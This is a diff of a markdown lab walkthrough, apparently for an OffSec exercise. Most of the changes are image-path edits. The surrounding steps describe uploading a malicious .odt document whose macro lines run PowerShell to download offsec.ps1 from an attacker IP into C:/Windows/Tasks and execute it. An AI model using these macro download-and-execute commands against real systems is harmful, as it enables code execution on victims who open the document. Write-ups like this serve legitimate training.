@@ -138,17 +138,17 @@ Enumerated top 200 UDP ports:
 
 #### - Typed "updog -p 80" (in the same directory where the newly created Offsec1.odt file is located in) on my kali machine to host the .odt file:
 
+![](Pasted%20image%2020230407230715.png)
 
 #### - Navigated back to the webpage and clicked "browse" and chose my newly created ".odt" file and clicked upload and received the following page showing the file was accepted:
 
-![](Images/Pasted%20image%2020220824174631.png)
+![](Pasted%20image%2020230407230828.png)
 
-![](Images/Pasted%20image%2020220821133156.png)
+![](Pasted%20image%2020230407230856.png)
 
 #### - Looking back on our kali machine hosting the .odt file we received code 200 and confirm we have execution on the target machine in the event someone opens the document we just uploaded to the target site
 
-![](Images/Pasted%20image%2020220824213229.png)
-
+![](Pasted%20image%2020230407230954.png)
 
 ---
 
@@ -163,8 +163,7 @@ Shell("cmd /c powershell iwr http://192.168.45.5:80/offsec.ps1 -o C:/Windows/Tas
 
 Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")
 
-![](Images/Pasted%20image%2020230322193151.png)
-
+![](Pasted%20image%2020230407231101.png)
 
 #### - Clicked File then save
 
